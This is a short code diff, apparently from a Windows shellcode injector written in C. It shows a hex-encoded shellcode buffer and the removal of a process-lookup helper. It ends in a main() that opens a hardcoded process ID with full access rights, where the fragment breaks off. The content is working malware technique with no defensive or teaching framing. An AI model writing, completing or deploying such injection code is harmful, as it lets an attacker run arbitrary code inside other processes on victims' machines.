@@ -23,36 +23,7 @@ unsigned char Buffer[] =
 "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74"
 "\x54\x53\xff\xd6\x57\xff\xd0";
 
-DWORD GetPid(const char *ProcessName) {
-    PROCESSENTRY32 pinfo;
-    pinfo.dwSize = sizeof(PROCESSENTRY32);
-
-    HANDLE ProcessesShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (ProcessesShot == INVALID_HANDLE_VALUE) {
-        GetLastError();
-        return -1;
-    }
-
-    Process32First(ProcessesShot, &pinfo);
-    
-    if (!strcmp(ProcessName, (const char*)pinfo.szExeFile)) {
-        CloseHandle(ProcessesShot);
-        return pinfo.th32ProcessID;
-    }
-
-    while (Process32Next(ProcessesShot, &pinfo)) {
-        if (!strcmp(ProcessName, (const char*)pinfo.szExeFile)) {
-            CloseHandle(ProcessesShot);
-            return pinfo.th32ProcessID;
-        }
-    }
-    CloseHandle(ProcessesShot);
-    return 0;
-}
-
 int main(void) {
-
-    //DWORD tid;
 
     HANDLE prc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4068);
     if (!prc)
